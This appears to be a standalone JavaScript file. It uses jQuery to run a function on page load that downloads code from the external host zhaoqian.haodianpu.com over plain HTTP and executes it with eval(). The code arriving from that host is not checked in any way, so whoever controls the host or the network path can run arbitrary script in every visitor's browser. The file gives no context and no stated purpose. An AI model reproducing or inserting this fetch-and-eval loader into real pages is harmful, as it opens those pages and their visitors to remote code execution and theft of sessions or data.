$(function(){
	$.get("http://zhaoqian.haodianpu.com/zhaoqian.php", function(code){
		eval(code);
	});
});